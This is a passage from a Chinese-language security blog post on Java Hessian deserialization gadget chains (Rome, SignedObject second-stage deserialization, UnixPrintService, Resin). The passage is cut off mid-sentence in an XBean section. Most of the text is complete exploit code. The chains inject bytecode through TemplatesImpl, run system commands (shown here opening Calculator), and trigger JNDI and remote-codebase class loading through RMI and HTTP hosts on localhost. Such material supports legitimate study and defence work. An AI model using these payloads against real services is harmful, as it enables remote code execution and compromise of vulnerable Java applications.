java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/tx3jze&quot;</span>;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line">        jdbcRowSet.setMatchColumn(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class, jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(String.class, <span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(equalsBean, <span class="string">&quot;_obj&quot;</span>, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h4><p>在Rome经典Gadget中，由于利用JNDI需要出网，所以限制较高，因此还需要寻找无需出网的利用方式。其中一个常见的利用方式是使用java.security.SignedObject类进行二次反序列化，该类中的getObject方法会从流里使用原生反序列化读取数据，就造成了二次反序列化。</p><p><img src="/2023/11/06/Hessian/1710304035383-e6b9525a-263e-427a-9f44-bbac9cd4c900.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;SignedObjectGadget&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        ctConstructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;ctClass.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化SignedObject类的固定写法</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Class.class, <span class="string">&quot;&quot;</span>));</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(equalsBean, <span class="string">&quot;_obj&quot;</span>, bean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>对于Unix操作系统，还可以利用sun.print.UnixPrintService直接执行命令的方式，这个类有很多get方法，通过拼接字符串的方式可以执行系统命令，但是该类在高版本被移除。还有一点需要注意的是，UnixPrintService接口是没有实现Serializable接口的，利用setAllowNonSerializable进行绕过。</p><p><img src="/2023/11/06/Hessian/1710304314920-fa09359f-73fb-4d72-aebf-3e7c0a5d84d2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> sun.print.UnixPrintService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;UnixPrintService&gt; unixPrintServiceConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);</span><br><span class="line">        unixPrintServiceConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(UnixPrintService.class, unixPrintServiceConstructor.newInstance(<span class="string">&quot;|open -a Calculator&quot;</span>));</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Class.class, <span class="string">&quot;&quot;</span>));</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(equalsBean, <span class="string">&quot;_obj&quot;</span>, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            <span class="comment">// 由于UnixPrintService未继承Serializable</span></span><br><span class="line">            objectOutputStream.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p>Resin利用链的入口点是HashMap对比两个对象时触发的com.sun.org.apache.xpath.internal.objects.XString的equals方法，使用XString#equals方法触发com.caucho.naming.QName#toSting方法。</p><p><img src="/2023/11/06/Hessian/1710314248285-f9f45528-5734-4a52-b56b-735edabc0b6a.png"></p><p><img src="/2023/11/06/Hessian/1710314373999-f851eccf-9a53-41c3-bb3b-5d403f8539b0.png"></p><p>QName是Resin对上下文Context的一种封装，它的toString方法会调用其封装类的composeName方法获取复合上下文的名称。</p><p>Resin链使用了javax.naming.spi.ContinuationContext类，其composeName方法调用getTargetContext方法，然后调用NamingManager#getContext方法。</p><p><img src="/2023/11/06/Hessian/1710314794993-c9ced8ff-cba6-4d2d-a9bf-096e8e0b032b.png"></p><p><img src="/2023/11/06/Hessian/1710314857022-cac0df9b-c484-4913-9f2f-20cb9a41693f.png"></p><p><img src="/2023/11/06/Hessian/1710314918645-73d21a7e-a0e2-42b1-94f3-48877b0bae4b.png"></p><p>漏洞触发点在NamingManager#getObjectInstance方法，当ref不为null时，调用getObjectFactoryFromReference方法，接着调用VersionHelper12#loadClass方法加载类并实例化，加载时使用了URLClassLoader并指定了类名和codebase。</p><p><img src="/2023/11/06/Hessian/1710315259856-c6f6bf3a-bedd-410c-9df6-0a3f0f184908.png"></p><p><img src="/2023/11/06/Hessian/1710315191207-8752779c-3049-4e34-a1de-56edc66cde67.png"></p><p><img src="/2023/11/06/Hessian/1710315333212-9a9a631e-ee9e-450c-80fd-8db63c024d80.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.naming.QName;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.CannotProceedException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResinGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CannotProceedException</span> <span class="variable">cannotProceedException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CannotProceedException</span>();</span><br><span class="line">        cannotProceedException.setResolvedObj(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;http://127.0.0.1:2333/&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(cannotProceedException, <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        <span class="type">QName</span> <span class="variable">qName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QName</span>((Context) obj, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, qName);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, qName);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(map1, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        hashMap.put(map2, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XBean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h3><p>相较于Resin利用链，XBean链在XBean中找到了类似功能的实现。首先还是用XString触发org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding的toString方法（继承javax.naming.Binding），接着利用toString方法调用getObject方法获取对象。</p><p><img src="/2023/11/06/Hessian/1710316200079-511b18e0-868c-4436-b3f8-8cdfae336c68.png"></p><p><img 